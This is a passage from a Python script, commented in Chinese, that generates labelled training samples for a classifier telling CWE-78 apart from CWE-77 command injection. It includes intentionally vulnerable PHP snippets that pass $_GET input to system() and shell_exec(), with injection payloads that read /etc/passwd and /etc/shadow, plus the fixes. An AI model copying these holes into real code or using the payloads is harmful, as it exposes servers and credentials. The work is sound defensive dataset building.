        fix_desc="避免 sh -c 拼接，直接用列表参数: exec.Command('grep', pattern, '/var/log/app.log').Output()"))

    # --- Pair 4: PHP ---
    # CWE-78 OS Command Injection — system() with user input
    code = r'''<?php
function ping_host($target) {
    $cmd = "ping -c 4 " . $target;
    $result = system($cmd);
    return $result;
}

$target = $_GET['target'] ?? '';
echo ping_host($target);
?>
'''
    S.append(_spec("php", code,
        "分析过程：\n"
        "1. line 8: $_GET['target'] 直接来自用户请求参数。\n"
        "2. line 3: 将 $target 拼接进 shell 命令字符串。\n"
        "3. line 4: system($cmd) 通过 shell 执行拼接后的命令。\n"
        "4. 攻击者传入 ; cat /etc/passwd 可读取系统文件。\n"
        "5. 归因为 CWE-78 而非 CWE-77：用户输入直接进入 system() 的命令字符串，sink 是 OS 命令执行本身，而非命令参数注入。\n"
        "6. 结论：CWE-78 OS Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-78 OS Command Injection", risk="Critical",
        source_marker="$_GET['target']",
        source_desc="$_GET['target'] 用户可控目标主机",
        sink_marker="system($cmd)",
        sink_desc='system("ping -c 4 " . $target) 通过 shell 执行拼接的命令',
        explanation="line 8 $_GET['target'] -> line 3 拼接进命令 -> line 4 system 执行 -> 攻击者注入 ; cat /etc/passwd。归因 CWE-78 而非 CWE-77：sink 是 system 直接执行完整命令字符串",
        fix_marker="system($cmd)",
        fix_desc="使用 escapeshellarg 转义参数: $cmd = 'ping -c 4 ' . escapeshellarg($target); system($cmd)，并校验 target 格式"))

    # CWE-77 Command Injection — shell_exec with sh -c and user input as argument
    code = r'''<?php
function grep_log($pattern) {
    $cmd = "sh -c 'grep " . $pattern . " /var/log/app.log'";
    $result = shell_exec($cmd);
    return $result;
}

$pattern = $_GET['pattern'] ?? '';
echo grep_log($pattern);
?>
'''
    S.append(_spec("php", code,
        "分析过程：\n"
        "1. line 8: $_GET['pattern'] 直接来自用户请求参数。\n"
        "2. line 3: 将 $pattern 拼接进 sh -c 的命令字符串参数（grep 的参数）。\n"
        "3. line 4: shell_exec($cmd) 通过 shell 执行拼接后的命令。\n"
        "4. 攻击者传入 ' /etc/passwd; cat /etc/shadow; echo ' 可执行任意命令。\n"
        "5. 归因为 CWE-77 而非 CWE-78：注入点在命令参数（pattern 是 grep 的搜索模式），而非命令本身。命令固定为 grep，但通过 sh -c 拼接导致参数注入。\n"
        "6. 结论：CWE-77 Command Injection，风险 Critical。",
        has_vuln=True, vuln_type="CWE-77 Command Injection", risk="Critical",
        source_marker="$_GET['pattern']",
        source_desc="$_GET['pattern'] 用户可控搜索模式",
        sink_marker="shell_exec($cmd)",
        sink_desc='shell_exec("sh -c \'grep " . $pattern . " ...\'") 通过 sh -c 执行拼接命令',
        explanation="line 8 $_GET['pattern'] -> line 3 拼接进 sh -c 命令参数 -> line 4 shell_exec 执行 -> 攻击者注入 ' /etc/passwd; cat /etc/shadow; echo '。归因 CWE-77 而非 CWE-78：注入点在命令参数（grep pattern）而非命令本身",
        fix_marker="shell_exec($cmd)",
        fix_desc="避免 sh -c 拼接，直接用 escapeshellarg: $cmd = 'grep ' . escapeshellarg($pattern) . ' /var/log/app.log'; shell_exec($cmd)"))

    return S


# ===========================================================================
# 主函数
# ===========================================================================
def main():
    """组合所有生成器，校验样本，写入 JSONL，打印统计。"""
    generators = [
        ("SQL vs NoSQL 边界对", gen_sql_vs_nosql),
        ("信息泄露 vs 注入 边界对", gen_infoleak_vs_injection),
        ("CWE-329 vs CWE-798 边界对", gen_cwe329_vs_cwe798),
        ("CWE-89 vs CWE-79 边界对", gen_cwe89_vs_cwe79),
        ("CWE-78 vs CWE-77 边界对", gen_cwe78_vs_cwe77),
    ]

    all_specs = []
    print("=" * 70)
    print("模式 B：细粒度 CWE 分类边界对样本生成")
    print("=" * 70)

    for name, gen_func in generators:
        specs = gen_func()
        print(f"  [{name}] 生成 {len(specs)} 条")
        all_specs.extend(specs)

    total = len(all_specs)
    print(f"\n总样本数: {total}")

    # --- 校验所有样本 ---
    print("\n--- 校验样本 ---")
    has_error = False
    for i, spec in enumerate(all_specs, 1):
        errors = validate_spec(spec)
        if errors:
            has_error = True
            print(f"  [FAIL] 样本 #{i} ({spec['lang']}):")
            for err in errors:
                print(f"         - {err}")

    if has_error:
        print("\n[错误] 存在校验失败的样本，请修复后再运行。")
        return 1

    print("  所有样本校验通过。")

    # --- 写入 JSONL ---
    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        for spec in all_specs:
            record = make_sample(spec["lang"], spec["code"], spec["analysis"], spec["verdict"])
            f.write(json.dumps(record, ensure_ascii=False) + "\n")

    # --- 统计 ---
    print(f"\n--- 输出 ---")
    print(f"  文件: {OUTPUT_FILE}")
    print(f"  行数: {total}")

    print(f"\n--- 统计 ---")
    lang_counter = Counter(spec["lang"] for spec in all_specs)
    vuln_counter = Counter(
        spec["verdict"]["vulnerability_type"] for spec in all_specs
        if spec["verdict"]["has_vulnerability"]
    )
    risk_counter = Counter(
        spec["verdict"]["risk_level"] for spec in all_specs
        if spec["verdict"]["has_vulnerability"]
    )
    safe_count = sum(1 for spec in all_specs if not spec["verdict"]["has_vulnerability"])
    vuln_count = total - safe_count

    print(f"  漏洞/安全: {vuln_count} 漏洞 + {safe_count} 安全")
    print(f"  语言分布: {dict(sorted(lang_counter.items(), key=lambda x: -x[1]))}")
    print(f"  风险分布: {dict(sorted(risk_counter.items(), key=lambda x: -x[1]))}")
    print(f"  CWE 分布:")
    for cwe, count in sorted(vuln_counter.items(), key=lambda x: -x[1]):
        print(f"    {cwe}: {count}")

    print(f"\n[完成] 已生成 {total} 条样本到 {OUTPUT_FILE}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
